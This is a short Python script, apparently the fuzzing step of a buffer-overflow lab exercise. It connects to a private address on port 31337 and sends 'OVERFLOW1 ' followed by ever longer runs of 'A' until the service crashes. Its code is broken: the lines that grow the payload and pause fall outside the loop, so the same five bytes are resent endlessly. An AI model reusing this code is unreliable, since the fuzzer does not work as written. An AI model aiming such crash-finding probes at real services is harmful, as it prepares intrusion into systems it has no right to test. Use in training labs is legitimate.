#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.100.88"
port = 31337
timeout = 10
prefix = "OVERFLOW1 "
string = prefix + "A" * 5

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "ascii"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
string += 5 * "A"
time.sleep(1)